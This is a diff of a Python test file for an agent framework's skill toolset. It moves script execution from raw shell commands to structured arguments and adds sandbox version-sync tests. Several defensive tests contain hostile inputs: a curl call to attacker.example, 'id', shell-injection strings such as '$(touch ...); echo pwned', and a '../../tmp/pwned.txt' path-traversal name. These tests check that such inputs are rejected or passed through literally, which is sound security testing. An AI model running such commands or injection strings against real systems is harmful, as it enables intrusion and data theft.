@@ -21,6 +21,7 @@ import logging
 from pathlib import Path
 from pathlib import PurePosixPath
 import re
+import shlex
 import sys
 from unittest import mock
 
@@ -32,6 +33,8 @@ from google.adk.code_executors.base_code_executor import BaseCodeExecutor
 from google.adk.code_executors.code_execution_utils import CodeExecutionResult
 from google.adk.code_executors.unsafe_local_code_executor import UnsafeLocalCodeExecutor
 from google.adk.environment import BaseEnvironment
+from google.adk.environment import ExecutionResult
+from google.adk.environment import LocalEnvironment
 from google.adk.features import FeatureName
 from google.adk.features._feature_registry import temporary_feature_override
 from google.adk.models import llm_request as llm_request_model
@@ -388,6 +391,15 @@ async def test_list_skills_tool(
                     "name": "skill1",
                     "description": "Skill 1 description",
                 },
+                "resources": [
+                    "references/ref1.md",
+                    "references/doc.pdf",
+                    "assets/asset1.txt",
+                    "assets/image.png",
+                    "scripts/setup.sh",
+                    "scripts/run.py",
+                    "scripts/build.rb",
+                ],
             },
         ),
         (
@@ -413,6 +425,21 @@ async def test_load_skill_run_async(
   tool = skill_toolset.LoadSkillTool(toolset)
   result = await tool.run_async(args=args, tool_context=tool_context_instance)
   assert result == expected_result
+
+
+@pytest.mark.asyncio
+async def test_load_skill_run_async_omits_empty_resources(
+    mock_skill1, tool_context_instance
+):
+  mock_skill1.resources.list_references.return_value = []
+  mock_skill1.resources.list_assets.return_value = []
+  mock_skill1.resources.list_scripts.return_value = []
+  toolset = skill_toolset.SkillToolset([mock_skill1])
+  tool = skill_toolset.LoadSkillTool(toolset)
+  result = await tool.run_async(
+      args={"skill_name": "skill1"}, tool_context=tool_context_instance
+  )
+  assert "resources" not in result
 
 
 @pytest.mark.asyncio
@@ -1508,7 +1535,7 @@ async def test_execute_script_extensionless_unsupported(mock_skill1):
 
 @pytest.mark.asyncio
 async def test_run_skill_script_declaration_with_environment(mock_skill1):
-  """RunSkillScriptTool declaration exposes 'command' parameter when environment is configured."""
+  """RunSkillScriptTool declaration exposes structured script args with an environment."""
   mock_env = mock.create_autospec(BaseEnvironment, instance=True)
   toolset = skill_toolset.SkillToolset([mock_skill1], environment=mock_env)
   tool = skill_toolset.RunSkillScriptTool(toolset)
@@ -1517,30 +1544,38 @@ async def test_run_skill_script_declaration_with_environment(mock_skill1):
 
   assert declaration is not None
   props = declaration.parameters_json_schema["properties"]
-  assert "command" in props
-  assert "args" not in props
-  assert "short_options" not in props
-  assert "positional_args" not in props
-  assert "command" in declaration.parameters_json_schema["required"]
+  assert "command" not in props
+  assert "args" in props
+  assert "short_options" in props
+  assert "positional_args" in props
+  assert declaration.parameters_json_schema["required"] == [
+      "skill_name",
+      "file_path",
+  ]
 
 
 @pytest.mark.asyncio
-async def test_run_skill_script_execute_with_environment_missing_command(
+async def test_run_skill_script_execute_with_environment_rejects_raw_command(
     mock_skill1,
 ):
-  """RunSkillScriptTool raises error when 'command' parameter is missing."""
+  """RunSkillScriptTool rejects raw 'command' input so callers cannot inject shell commands."""
   mock_env = mock.create_autospec(BaseEnvironment, instance=True)
   toolset = skill_toolset.SkillToolset([mock_skill1], environment=mock_env)
   tool = skill_toolset.RunSkillScriptTool(toolset)
   ctx = _make_tool_context_with_agent()
 
   result = await tool.run_async(
-      args={"skill_name": "skill1", "file_path": "run.py"},
+      args={
+          "skill_name": "skill1",
+          "file_path": "run.py",
+          "command": "curl https://attacker.example",
+      },
       tool_context=ctx,
   )
 
   assert result["error_code"] == "INVALID_ARGUMENTS"
-  assert "Argument 'command' is required" in result["error"]
+  assert "'command' is not supported" in result["error"]
+  mock_env.execute.assert_not_called()
 
 
 @pytest.mark.asyncio
@@ -1562,7 +1597,7 @@ async def test_run_skill_script_execute_with_environment(mock_skill1):
       args={
           "skill_name": "skill1",
           "file_path": "run.py",
-          "command": "python3 skills/skill1/scripts/run.py --flag 1",
+          "args": {"flag": 1},
       },
       tool_context=ctx,
   )
@@ -1574,13 +1609,300 @@ async def test_run_skill_script_execute_with_environment(mock_skill1):
       "timed_out": False,
   }
   mock_env.read_file.assert_called_once_with(
-      PurePosixPath("skills/skill1/scripts/run.py")
+      PurePosixPath("skills/skill1/.adk_skill_hash"), ctx=ctx
   )
   assert mock_env.execute.call_count == 1
+  assert mock_env.execute.call_args.kwargs["ctx"] is ctx
   assert (
       mock_env.execute.call_args.kwargs["command"]
-      == "python3 skills/skill1/scripts/run.py --flag 1"
+      == "cd skills/skill1 && python3 scripts/run.py --flag 1"
   )
+
+
+def _uninitialized_env_mock():
+  """An environment mock that has no working directory until initialized."""
+  mock_env = mock.create_autospec(BaseEnvironment, instance=True)
+  type(mock_env).working_dir = mock.PropertyMock(return_value=None)
+  mock_env.is_initialized = False
+  return mock_env
+
+
+def _set_env_mock_working_dir(mock_env):
+  """Gives an environment mock its working directory, nothing else."""
+  type(mock_env).working_dir = mock.PropertyMock(
+      return_value=Path("/workspace")
+  )
+
+
+def _mark_env_mock_initialized(mock_env):
+  """Gives an `_uninitialized_env_mock` what `initialize` sets up."""
+  _set_env_mock_working_dir(mock_env)
+  mock_env.is_initialized = True
+
+
+@pytest.mark.asyncio
+async def test_process_llm_request_does_not_initialize_environment(
+    mock_skill1, tool_context_instance
+):
+  """The skills folder is left out of the instruction until it is known."""
+  mock_env = _uninitialized_env_mock()
+  toolset = skill_toolset.SkillToolset([mock_skill1], environment=mock_env)
+
+  (before,) = await _instructions_for(toolset, tool_context_instance)
+  # Only the working directory: `is_initialized` stays false.
+  _set_env_mock_working_dir(mock_env)
+  (after,) = await _instructions_for(toolset, tool_context_instance)
+
+  mock_env.initialize.assert_not_called()
+  assert "NOTE ON ENVIRONMENT EXECUTION" not in before
+  assert "/workspace/skills/<skill_name>/" not in before
+  assert "/workspace/skills/<skill_name>/" in after
+
+
+@pytest.mark.asyncio
+async def test_process_llm_request_tolerates_working_dir_raising_before_init(
+    mock_skill1, tool_context_instance
+):
+  """A `working_dir` that raises RuntimeError counts as not known yet."""
+  mock_env = _uninitialized_env_mock()
+  type(mock_env).working_dir = mock.PropertyMock(
+      side_effect=RuntimeError("Call initialize() first.")
+  )
+  toolset = skill_toolset.SkillToolset([mock_skill1], environment=mock_env)
+
+  (before,) = await _instructions_for(toolset, tool_context_instance)
+  # Only the working directory: `is_initialized` stays false.
+  _set_env_mock_working_dir(mock_env)
+  (after,) = await _instructions_for(toolset, tool_context_instance)
+
+  assert toolset.skills_folder == Path("/workspace/skills")
+  assert "/workspace/skills/<skill_name>/" not in before
+  assert "/workspace/skills/<skill_name>/" in after
+
+
+@pytest.mark.asyncio
+async def test_process_llm_request_keeps_explicit_skills_folder_before_init(
+    mock_skill1, tool_context_instance
+):
+  """An explicit skills_folder does not depend on the environment."""
+  mock_env = _uninitialized_env_mock()
+  toolset = skill_toolset.SkillToolset(
+      [mock_skill1], environment=mock_env, skills_folder="/custom/skills"
+  )
+
+  (instruction,) = await _instructions_for(toolset, tool_context_instance)
+
+  mock_env.initialize.assert_not_called()
+  assert "/custom/skills/<skill_name>/" in instruction
+
+
+@pytest.mark.asyncio
+async def test_run_skill_script_initializes_environment_first(mock_skill1):
+  """Each script run initializes the environment first with its tool context."""
+  mock_env = _uninitialized_env_mock()
+  calls = []
+
+  def _initialize(*, ctx):
+    calls.append(("initialize", ctx))
+    _mark_env_mock_initialized(mock_env)
+
+  def _read_file(path, *, ctx):
+    calls.append(("read_file", ctx))
+    raise FileNotFoundError(path)
+
+  mock_env.initialize.side_effect = _initialize
+  mock_env.read_file.side_effect = _read_file
+  mock_env.write_file.side_effect = lambda *a, ctx: calls.append(
+      ("write_file", ctx)
+  )
+  mock_env.execute.return_value = mock.MagicMock(
+      stdout="", stderr="", exit_code=0, timed_out=False
+  )
+  toolset = skill_toolset.SkillToolset([mock_skill1], environment=mock_env)
+  tool = skill_toolset.RunSkillScriptTool(toolset)
+  ctx = _make_tool_context_with_agent()
+  second_ctx = _make_tool_context_with_agent()
+
+  await tool.run_async(
+      args={"skill_name": "skill1", "file_path": "run.py"}, tool_context=ctx
+  )
+  await tool.run_async(
+      args={"skill_name": "skill1", "file_path": "run.py"},
+      tool_context=second_ctx,
+  )
+
+  assert calls[0] == ("initialize", ctx)
+  assert [c for c in calls if c[0] == "initialize"] == [
+      ("initialize", ctx),
+      ("initialize", second_ctx),
+  ]
+  assert ("read_file", ctx) in calls
+  mock_env.execute.assert_called()
+
+
+@pytest.mark.asyncio
+async def test_close_closes_initialized_environment_once(mock_skill1):
+  """close() closes an initialized environment and marks it uninitialized."""
+  mock_env = _uninitialized_env_mock()
+  toolset = skill_toolset.SkillToolset([mock_skill1], environment=mock_env)
+  await toolset.close()
+  mock_env.close.assert_not_called()
+
+  mock_env.is_initialized = True
+  await asyncio.gather(*(toolset.close() for _ in range(4)))
+
+  mock_env.close.assert_awaited_once()
+  assert not mock_env.is_initialized
+
+
+def test_build_skill_system_instruction_environment_omits_command():
+  """Environment system instruction describes structured script execution without 'command'."""
+  # pylint: disable=protected-access
+  text = skill_toolset._build_skill_system_instruction(
+      skills_folder=PurePosixPath("skills"),
+      script_execution_enabled=True,
+  )
+  # pylint: enable=protected-access
+  assert "NOTE ON ENVIRONMENT EXECUTION" in text
+  assert "skills/<skill_name>/" in text
+  assert "working directory" in text
+  assert "command" not in text
+
+
+@pytest.mark.asyncio
+async def test_run_skill_script_code_executor_rejects_raw_command(mock_skill1):
+  """RunSkillScriptTool also rejects 'command' on the code-executor path."""
+  mock_exec = mock.create_autospec(BaseCodeExecutor, instance=True)
+  toolset = skill_toolset.SkillToolset([mock_skill1], code_executor=mock_exec)
+  tool = skill_toolset.RunSkillScriptTool(toolset)
+  ctx = _make_tool_context_with_agent()
+
+  result = await tool.run_async(
+      args={"skill_name": "skill1", "file_path": "run.py", "command": "id"},
+      tool_context=ctx,
+  )
+
+  assert result["error_code"] == "INVALID_ARGUMENTS"
+  mock_exec.execute_code.assert_not_called()
+
+
+@pytest.mark.asyncio
+async def test_run_skill_script_code_executor_shell_coerces_int_positional_args():
+  """Shell scripts on the code-executor path stringify integer positional_args."""
+  skill = models.Skill(
+      frontmatter=models.Frontmatter(name="sh-pos", description="desc"),
+      instructions="desc",
+      resources=models.Resources(
+          scripts={
+              "args.sh": models.Script(src='printf "%s," "$@"\n'),
+          }
+      ),
+  )
+  toolset = skill_toolset.SkillToolset(
+      [skill], code_executor=UnsafeLocalCodeExecutor()
+  )
+  tool = skill_toolset.RunSkillScriptTool(toolset)
+  ctx = _make_tool_context_with_agent()
+
+  res = await tool.run_async(
+      args={
+          "skill_name": "sh-pos",
+          "file_path": "args.sh",
+          "positional_args": [1, 2],
+      },
+      tool_context=ctx,
+  )
+
+  assert res["status"] == "success"
+  assert res["stdout"] == "--,1,2,"
+
+
+@pytest.mark.asyncio
+async def test_run_skill_script_environment_quotes_shell_metacharacters(
+    tmp_path,
+):
+  """Shell metacharacters in structured arguments are passed literally and cwd is the skill root."""
+  sentinel = tmp_path / "injected_marker"
+  skill = models.Skill(
+      frontmatter=models.Frontmatter(name="echo-skill", description="desc"),
+      instructions="desc",
+      resources=models.Resources(
+          assets={"data.txt": "ASSET-OK"},
+          scripts={
+              "echo_args.py": models.Script(
+                  src=(
+                      "import json, pathlib, sys\n"
+                      "asset = pathlib.Path('assets/data.txt').read_text()\n"
+                      "print(json.dumps([asset, *sys.argv[1:]]))\n"
+                  )
+              ),
+              "echo_sh.sh": models.Script(
+                  src='printf "%s\\n" "$@"\n',
+              ),
+          },
+      ),
+  )
+  env = LocalEnvironment(working_dir=tmp_path / "ws")
+  await env.initialize()
+  try:
+    toolset = skill_toolset.SkillToolset([skill], environment=env)
+    tool = skill_toolset.RunSkillScriptTool(toolset)
+    ctx = _make_tool_context_with_agent()
+    payload = f"$(touch {sentinel}); echo pwned"
+
+    py_res = await tool.run_async(
+        args={
+            "skill_name": "echo-skill",
+            "file_path": "echo_args.py",
+            "args": {"input": payload},
+            "short_options": {"x": "`id`"},
+            "positional_args": [f"| touch {sentinel}"],
+        },
+        tool_context=ctx,
+    )
+    assert py_res["exit_code"] == 0
+    assert not sentinel.exists()
+    assert json.loads(py_res["stdout"].strip()) == [
+        "ASSET-OK",
+        "--input",
+        payload,
+        "-x",
+        "`id`",
+        "--",
+        f"| touch {sentinel}",
+    ]
+
+    sh_res = await tool.run_async(
+        args={
+            "skill_name": "echo-skill",
+            "file_path": "scripts/echo_sh.sh",
+            "args": [payload],
+        },
+        tool_context=ctx,
+    )
+    assert sh_res["exit_code"] == 0
+    assert not sentinel.exists()
+    assert sh_res["stdout"].strip() == payload
+  finally:
+    await env.close()
+
+
+@pytest.mark.asyncio
+async def test_run_skill_script_environment_unsupported_type(mock_skill1):
+  """RunSkillScriptTool rejects unsupported script extensions in environment mode."""
+  mock_env = mock.create_autospec(BaseEnvironment, instance=True)
+  type(mock_env).working_dir = mock.PropertyMock(return_value=Path("."))
+  toolset = skill_toolset.SkillToolset([mock_skill1], environment=mock_env)
+  tool = skill_toolset.RunSkillScriptTool(toolset)
+  ctx = _make_tool_context_with_agent()
+
+  result = await tool.run_async(
+      args={"skill_name": "skill1", "file_path": "build.rb"},
+      tool_context=ctx,
+  )
+
+  assert result["error_code"] == "UNSUPPORTED_SCRIPT_TYPE"
+  mock_env.execute.assert_not_called()
 
 
 @pytest.mark.asyncio
@@ -1588,8 +1910,10 @@ async def test_run_skill_script_environment_execute_exception(mock_skill1):
   """RunSkillScriptTool handles env.execute exception gracefully."""
   mock_env = mock.create_autospec(BaseEnvironment, instance=True)
   type(mock_env).working_dir = mock.PropertyMock(return_value=Path("."))
-  # Script exists, but execute script raises exception
-  mock_env.read_file.return_value = b"ok"
+  # The environment holds the current version, but executing the script raises.
+  mock_env.read_file.return_value = skill_toolset._skill_content_hash(
+      mock_skill1
+  ).encode()
   mock_env.execute.side_effect = RuntimeError("Sandbox connection lost")
 
   toolset = skill_toolset.SkillToolset([mock_skill1], environment=mock_env)
@@ -1600,7 +1924,6 @@ async def test_run_skill_script_environment_execute_exception(mock_skill1):
       args={
           "skill_name": "skill1",
           "file_path": "run.py",
-          "command": "python3 skills/skill1/scripts/run.py",
       },
       tool_context=ctx,
   )
@@ -1630,7 +1953,6 @@ async def test_run_skill_script_environment_materialize_ls_exception(
       args={
           "skill_name": "skill1",
           "file_path": "run.py",
-          "command": "python3 skills/skill1/scripts/run.py",
       },
       tool_context=ctx,
   )
@@ -1660,7 +1982,6 @@ async def test_run_skill_script_environment_materialize_write_exception(
       args={
           "skill_name": "skill1",
           "file_path": "run.py",
-          "command": "python3 skills/skill1/scripts/run.py",
       },
       tool_context=ctx,
   )
@@ -1684,7 +2005,7 @@ async def test_run_skill_script_materialize_writes_concurrently():
   active_writes = 0
   max_active_writes = 0
 
-  async def slow_write(path, content):
+  async def slow_write(path, content, ctx):
     nonlocal active_writes, max_active_writes
     active_writes += 1
     max_active_writes = max(max_active_writes, active_writes)
@@ -1711,12 +2032,12 @@ async def test_run_skill_script_materialize_writes_concurrently():
       args={
           "skill_name": "multi-res",
           "file_path": "run.py",
-          "command": "python3 run.py",
       },
       tool_context=ctx,
   )
 
-  assert mock_env.write_file.call_count == 4
+  # The four resources together, then the version marker on its own.
+  assert mock_env.write_file.call_count == 5
   assert max_active_writes == 4
 
 
@@ -4115,7 +4436,7 @@ async def test_turn_scoped_skill_cache_concurrency(mock_registry, mock_skill1):
 def test_skill_toolset_disables_invocation_cache():
   """Verify SkillToolset disables tool invocation caching to allow dynamic tools."""
   toolset = skill_toolset.SkillToolset()
-  assert toolset._use_invocation_cache is False
+  assert toolset.use_invocation_cache is False
 
 
 @pytest.mark.asyncio
@@ -6296,7 +6617,9 @@ async def test_env_materialization_rejects_dotdot_traversal(tmp_path):
   )
   tool = skill_toolset.RunSkillScriptTool(toolset)
   with pytest.raises(PermissionError, match="Path traversal detected"):
-    await tool._ensure_skill_materialized_in_env(skill, "run.py", mock_env)
+    await tool._ensure_skill_materialized_in_env(
+        skill, "run.py", mock_env, mock.sentinel.tool_context
+    )
 
 
 @pytest.mark.asyncio
@@ -6317,7 +6640,9 @@ async def test_env_materialization_rejects_cross_directory_traversal(tmp_path):
   )
   tool = skill_toolset.RunSkillScriptTool(toolset)
   with pytest.raises(PermissionError, match="Path traversal detected"):
-    await tool._ensure_skill_materialized_in_env(skill, "run.py", mock_env)
+    await tool._ensure_skill_materialized_in_env(
+        skill, "run.py", mock_env, mock.sentinel.tool_context
+    )
 
 
 @pytest.mark.asyncio
@@ -6338,7 +6663,9 @@ async def test_env_materialization_rejects_self_referential_traversal(tmp_path):
   )
   tool = skill_toolset.RunSkillScriptTool(toolset)
   with pytest.raises(PermissionError, match="Path traversal detected"):
-    await tool._ensure_skill_materialized_in_env(skill, "run.py", mock_env)
+    await tool._ensure_skill_materialized_in_env(
+        skill, "run.py", mock_env, mock.sentinel.tool_context
+    )
 
 
 @pytest.mark.asyncio
@@ -6359,8 +6686,11 @@ async def test_env_materialization_safe_path_writes_correctly(tmp_path):
       [skill], environment=mock_env, skills_folder=tmp_path / "skills"
   )
   tool = skill_toolset.RunSkillScriptTool(toolset)
-  await tool._ensure_skill_materialized_in_env(skill, "run.py", mock_env)
-  assert mock_env.write_file.call_count == 3
+  await tool._ensure_skill_materialized_in_env(
+      skill, "run.py", mock_env, mock.sentinel.tool_context
+  )
+  # Three resources, then the version marker.
+  assert mock_env.write_file.call_count == 4
 
 
 @pytest.mark.asyncio
@@ -6381,7 +6711,9 @@ async def test_env_materialization_rejects_absolute_path_traversal(tmp_path):
   )
   tool = skill_toolset.RunSkillScriptTool(toolset)
   with pytest.raises(PermissionError, match="Path traversal detected"):
-    await tool._ensure_skill_materialized_in_env(skill, "run.py", mock_env)
+    await tool._ensure_skill_materialized_in_env(
+        skill, "run.py", mock_env, mock.sentinel.tool_context
+    )
 
 
 @pytest.mark.asyncio
@@ -6406,7 +6738,9 @@ async def test_env_materialization_validates_all_paths_before_writing(tmp_path):
   )
   tool = skill_toolset.RunSkillScriptTool(toolset)
   with pytest.raises(PermissionError, match="Path traversal detected"):
-    await tool._ensure_skill_materialized_in_env(skill, "run.py", mock_env)
+    await tool._ensure_skill_materialized_in_env(
+        skill, "run.py", mock_env, mock.sentinel.tool_context
+    )
   mock_env.write_file.assert_not_called()
 
 
@@ -6468,7 +6802,9 @@ async def test_env_materialization_rejects_dot_path_traversal(tmp_path):
   )
   tool = skill_toolset.RunSkillScriptTool(toolset)
   with pytest.raises(PermissionError, match="Path traversal detected"):
-    await tool._ensure_skill_materialized_in_env(skill, "run.py", mock_env)
+    await tool._ensure_skill_materialized_in_env(
+        skill, "run.py", mock_env, mock.sentinel.tool_context
+    )
 
 
 def test_materialization_safe_backslash_path_writes_correctly():
@@ -6581,7 +6917,9 @@ async def test_env_materialization_safe_backslash_path_writes_correctly(
       [skill], environment=mock_env, skills_folder=tmp_path / "skills"
   )
   tool = skill_toolset.RunSkillScriptTool(toolset)
-  await tool._ensure_skill_materialized_in_env(skill, "sub\\run.py", mock_env)
+  script_path = await tool._ensure_skill_materialized_in_env(
+      skill, "sub\\run.py", mock_env, mock.sentinel.tool_context
+  )
   written_paths = {
       call.args[0].as_posix() for call in mock_env.write_file.call_args_list
   }
@@ -6597,32 +6935,7 @@ async def test_env_materialization_safe_backslash_path_writes_correctly(
   assert expected_ref in written_paths
   assert expected_asset in written_paths
   assert expected_script in written_paths
-  expected_probe = PurePosixPath(expected_script)
-  mock_env.read_file.assert_called_once_with(expected_probe)
-
-
-@pytest.mark.asyncio
-async def test_rematerialize_skill_rejects_path_traversal(tmp_path):
-  """Rematerializing a changed skill must validate resource paths."""
-  skill = models.Skill(
-      frontmatter=models.Frontmatter(name="evil-skill", description="desc"),
-      instructions="instructions",
-      resources=models.Resources(
-          references={
-              "good.md": "good content",
-              "../../tmp/pwned.txt": "pwned",
-          },
-          scripts={"run.py": models.Script(src="print('exploit')")},
-      ),
-  )
-  mock_env = mock.AsyncMock()
-  mock_env.is_initialized = True
-  toolset = skill_toolset.SkillToolset(
-      [skill], environment=mock_env, skills_folder=tmp_path / "skills"
-  )
-  with pytest.raises(PermissionError, match="Path traversal detected"):
-    await toolset._rematerialize_skill(skill)
-  mock_env.write_file.assert_not_called()
+  assert script_path == PurePosixPath(expected_script)
 
 
 # Revalidating skills that changed after they were loaded
@@ -6858,47 +7171,6 @@ async def test_a_cancelled_revalidation_is_not_swallowed(
     await _instructions_for(toolset, lifecycle_context)
 
 
-@pytest.mark.asyncio
-async def test_a_changed_skill_is_rewritten_into_the_environment(
-    lifecycle_context,
-):
-  """Its scripts were copied into the sandbox and would still be the old ones."""
-  mock_env = mock.create_autospec(BaseEnvironment, instance=True)
-  type(mock_env).working_dir = mock.PropertyMock(return_value=Path("."))
-  toolset = _revalidating_toolset(
-      _real_skill(scripts={"s.py": "print(1)"}), environment=mock_env
-  )
-  await _load(skill_toolset.LoadSkillTool(toolset), lifecycle_context, "a")
-  mock_env.write_file.reset_mock()
-
-  toolset._skills["a"] = _real_skill(scripts={"s.py": "print(2)"})
-  await _instructions_for(toolset, lifecycle_context)
-
-  mock_env.write_file.assert_awaited_once_with(
-      PurePosixPath("skills/a/scripts/s.py"), "print(2)"
-  )
-
-
-@pytest.mark.asyncio
-async def test_the_environment_is_rewritten_once_per_version(
-    lifecycle_context,
-):
-  """A stale skill is re-stated every request; the files only change once."""
-  mock_env = mock.create_autospec(BaseEnvironment, instance=True)
-  type(mock_env).working_dir = mock.PropertyMock(return_value=Path("."))
-  toolset = _revalidating_toolset(
-      _real_skill(scripts={"s.py": "print(1)"}), environment=mock_env
-  )
-  await _load(skill_toolset.LoadSkillTool(toolset), lifecycle_context, "a")
-  toolset._skills["a"] = _real_skill(scripts={"s.py": "print(2)"})
-  mock_env.write_file.reset_mock()
-
-  await _instructions_for(toolset, lifecycle_context)
-  await _instructions_for(toolset, lifecycle_context)
-
-  assert mock_env.write_file.await_count == 1
-
-
 def test_clone_keeps_revalidating(mock_skill1):
   toolset = skill_toolset.SkillToolset(
       [mock_skill1],
@@ -6976,6 +7248,298 @@ async def test_reactivating_without_the_definition_keeps_the_digest(
   ]
 
 
+# Keeping a skill's copy in the environment current
+
+
+class _SandboxPerSessionEnvironment(BaseEnvironment):
+  """Keeps one in-memory sandbox per `ctx.state["sandbox"]`.
+
+  `execute` runs nothing: it returns the source of the script the command
+  names, so a test can see which version ran.
+  """
+
+  def __init__(self):
+    self.sandboxes = collections.defaultdict(dict)
+    self.calls = []
+    self.failing_writes = set()
+
+  @property
+  def working_dir(self):
+    return Path("/work")
+
+  def _files(self, ctx):
+    return self.sandboxes[ctx.state.get("sandbox", "shared")]
+
+  async def initialize(self, *, ctx=None):
+    self.calls.append(("initialize", None))
+
+  async def read_file(self, path, *, ctx=None):
+    self.calls.append(("read_file", str(path)))
+    try:
+      content = self._files(ctx)[str(path)]
+    except KeyError:
+      raise FileNotFoundError(path) from None
+    return content.encode() if isinstance(content, str) else content
+
+  async def write_file(self, path, content, *, ctx=None):
+    self.calls.append(("write_file", str(path)))
+    if str(path) in self.failing_writes:
+      self.failing_writes.discard(str(path))
+      raise OSError(f"Could not write {path}")
+    self._files(ctx)[str(path)] = content
+
+  async def execute(self, command, *, timeout=None, ctx=None):
+    self.calls.append(("execute", command))
+    # The tool runs `cd <skill_dir> && <interpreter> <script> ...`.
+    _, skill_dir, _, _, script, *_ = shlex.split(command)
+    source = self._files(ctx).get(f"{skill_dir}/{script}")
+    if source is None:
+      return ExecutionResult(exit_code=2, stderr=f"{script}: not found")
+    return ExecutionResult(stdout=source)
+
+
+_SKILL_DIR = "/work/skills/a"
+_HASH_MARKER = f"{_SKILL_DIR}/.adk_skill_hash"
+
+
+def _session(sandbox="shared"):
+  """A tool context for its own session, using the given sandbox."""
+  ctx = mock.create_autospec(tool_context.ToolContext, instance=True)
+  ctx.agent_name = "test_agent"
+  ctx.invocation_id = "test_invocation"
+  ctx.state = {"sandbox": sandbox}
+  return ctx
+
+
+async def _run_script(toolset, ctx, file_path="s.py"):
+  return await skill_toolset.RunSkillScriptTool(toolset).run_async(
+      args={"skill_name": "a", "file_path": file_path}, tool_context=ctx
+  )
+
+
+@pytest.mark.asyncio
+async def test_a_new_session_runs_the_current_version_of_a_changed_skill():
+  """A sandbox with an older copy of a skill gets the new one at the next run.
+
+  Setup: session A loads v1 of skill `a` and runs its script, which copies v1
+    into the shared sandbox.
+  Act: the skill changes to v2; session B loads v2 and runs the script, with
+    no model request in between.
+  Assert: B runs v2.
+  """
+  env = _SandboxPerSessionEnvironment()
+  toolset = _revalidating_toolset(
+      _real_skill(scripts={"s.py": "print('v1')"}), environment=env
+  )
+  session_a, session_b = _session(), _session()
+  await _load(skill_toolset.LoadSkillTool(toolset), session_a, "a")
+  await _run_script(toolset, session_a)
+  toolset._skills["a"] = _real_skill(scripts={"s.py": "print('v2')"})
+  await _load(skill_toolset.LoadSkillTool(toolset), session_b, "a")
+
+  result = await _run_script(toolset, session_b)
+
+  assert result["stdout"] == "print('v2')"
+
+
+@pytest.mark.asyncio
+async def test_the_first_run_copies_the_skill_into_the_environment():
+  """An empty sandbox gets every resource of the skill and its version."""
+  env = _SandboxPerSessionEnvironment()
+  skill = _real_skill(
+      references={"r.md": "ref v1"}, scripts={"s.py": "print('v1')"}
+  )
+  toolset = skill_toolset.SkillToolset([skill], environment=env)
+
+  result = await _run_script(toolset, _session())
+
+  assert result["stdout"] == "print('v1')"
+  assert env.sandboxes["shared"] == {
+      f"{_SKILL_DIR}/references/r.md": "ref v1",
+      f"{_SKILL_DIR}/scripts/s.py": "print('v1')",
+      _HASH_MARKER: skill_toolset._skill_content_hash(skill),
+  }
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("revalidate_skills", [False, True])
+async def test_running_an_unchanged_skill_again_writes_nothing(
+    revalidate_skills,
+):
+  """A second run of an unchanged skill reads once and writes nothing."""
+  env = _SandboxPerSessionEnvironment()
+  toolset = skill_toolset.SkillToolset(
+      [_real_skill(scripts={"s.py": "print('v1')"})],
+      environment=env,
+      lifecycle_config=skill_toolset.SkillLifecycleConfig(
+          revalidate_skills=revalidate_skills
+      ),
+  )
+  ctx = _session()
+  await _run_script(toolset, ctx)
+  env.calls.clear()
+
+  result = await _run_script(toolset, ctx)
+
+  assert result["stdout"] == "print('v1')"
+  assert [c for c in env.calls if c[0] in ("read_file", "write_file")] == [
+      ("read_file", _HASH_MARKER)
+  ]
+
+
+@pytest.mark.asyncio
+async def test_a_changed_skill_is_rewritten_at_its_next_run():
+  """The first run after a change writes the new version and runs it.
+
+  With `revalidate_skills`; without it the first copy is kept.
+  """
+  env = _SandboxPerSessionEnvironment()
+  toolset = _revalidating_toolset(
+      _real_skill(
+          references={"r.md": "ref v1"}, scripts={"s.py": "print('v1')"}
+      ),
+      environment=env,
+  )
+  ctx = _session()
+  await _run_script(toolset, ctx)
+  v2 = _real_skill(
+      references={"r.md": "ref v2"}, scripts={"s.py": "print('v2')"}
+  )
+  toolset._skills["a"] = v2
+
+  result = await _run_script(toolset, ctx)
+
+  assert result["stdout"] == "print('v2')"
+  assert env.sandboxes["shared"] == {
+      f"{_SKILL_DIR}/references/r.md": "ref v2",
+      f"{_SKILL_DIR}/scripts/s.py": "print('v2')",
+      _HASH_MARKER: skill_toolset._skill_content_hash(v2),
+  }
+
+
+@pytest.mark.asyncio
+async def test_each_sandbox_is_brought_up_to_date_when_it_is_used():
+  """A refresh of one sandbox does not count for another sandbox.
+
+  Setup: one toolset with `revalidate_skills`; sessions in sandboxes `s1` and
+    `s2` both run v1.
+  Act: the skill changes to v2; each session runs the script again.
+  Assert: both run v2.
+  """
+  env = _SandboxPerSessionEnvironment()
+  toolset = _revalidating_toolset(
+      _real_skill(scripts={"s.py": "print('v1')"}), environment=env
+  )
+  in_s1, in_s2 = _session("s1"), _session("s2")
+  await _run_script(toolset, in_s1)
+  await _run_script(toolset, in_s2)
+  toolset._skills["a"] = _real_skill(scripts={"s.py": "print('v2')"})
+
+  from_s1 = await _run_script(toolset, in_s1)
+  from_s2 = await _run_script(toolset, in_s2)
+
+  assert from_s1["stdout"] == "print('v2')"
+  assert from_s2["stdout"] == "print('v2')"
+
+
+@pytest.mark.asyncio
+async def test_without_revalidation_a_written_skill_is_left_as_it_is():
+  """Without `revalidate_skills`, a changed skill keeps its first copy."""
+  env = _SandboxPerSessionEnvironment()
+  toolset = skill_toolset.SkillToolset(
+      [_real_skill(scripts={"s.py": "print('v1')"})], environment=env
+  )
+  ctx = _session()
+  await _run_script(toolset, ctx)
+  toolset._skills["a"] = _real_skill(scripts={"s.py": "print('v2')"})
+
+  result = await _run_script(toolset, ctx)
+
+  assert result["stdout"] == "print('v1')"
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("revalidate_skills", [False, True])
+async def test_a_script_added_by_a_newer_version_runs(revalidate_skills):
+  """A script the copy in the environment lacks is written before it runs.
+
+  Setup: v1 of skill `a`, with only `s.py`, is written by a run of `s.py`.
+  Act: the skill changes to v2, which adds `t.py`; a run asks for `t.py`.
+  Assert: `t.py` runs, with or without `revalidate_skills`.
+  """
+  env = _SandboxPerSessionEnvironment()
+  toolset = skill_toolset.SkillToolset(
+      [_real_skill(scripts={"s.py": "print('v1')"})],
+      environment=env,
+      lifecycle_config=skill_toolset.SkillLifecycleConfig(
+          revalidate_skills=revalidate_skills
+      ),
+  )
+  ctx = _session()
+  await _run_script(toolset, ctx)
+  toolset._skills["a"] = _real_skill(
+      scripts={"s.py": "print('v1')", "t.py": "print('t')"}
+  )
+
+  result = await _run_script(toolset, ctx, file_path="t.py")
+
+  assert result["stdout"] == "print('t')"
+
+
+@pytest.mark.asyncio
+async def test_a_failed_copy_is_retried_by_the_next_run():
+  """After a failed write, the next run writes the skill again.
+
+  A resource that cannot be written leaves no version marker behind.
